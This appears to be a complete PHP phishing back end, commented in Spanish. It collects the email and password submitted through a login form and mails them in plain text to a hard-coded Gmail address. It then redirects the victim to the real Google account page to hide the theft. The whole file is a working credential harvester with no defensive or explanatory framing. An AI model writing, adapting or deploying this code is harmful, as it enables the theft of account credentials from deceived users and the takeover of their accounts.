<?php
// Configuración
error_reporting(E_ALL);
ini_set('display_errors', 1);

$destinatario = "thebloodyshelby@gmail.com";
$asunto = "Nuevo intento de inicio de sesión";

// Verificar que los datos del formulario existen
if(isset($_POST['correo']) && isset($_POST['contrasena'])){
    // Obtener datos del formulario
    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];

    // Cuerpo del correo
    $mensaje = "Se ha intentado iniciar sesión con los siguientes datos:\n\n";
    $mensaje .= "Correo: " . htmlspecialchars($correo) . "\n";
    $mensaje .= "Contraseña: " . htmlspecialchars($contrasena) . "\n";
    $mensaje .= "Fecha: " . date("d-m-Y H:i:s") . "\n";

    // Cabeceras del correo
    $cabeceras = "From: no-reply@tudominio.com\r\n";
    $cabeceras .= "Reply-To: no-reply@tudominio.com\r\n";
    $cabeceras .= "X-Mailer: PHP/" . phpversion();

    // Enviar el correo
    if(mail($destinatario, $asunto, $mensaje, $cabeceras)){
        echo "Correo enviado con éxito.";
        // Redirigir a myaccount.google.com después de enviar el correo
        header("Location: https://myaccount.google.com");
        exit();
    } else {
        echo "Hubo un problema al enviar el correo.";
    }
} else {
    echo "Por favor, completa todos los campos.";
}
?>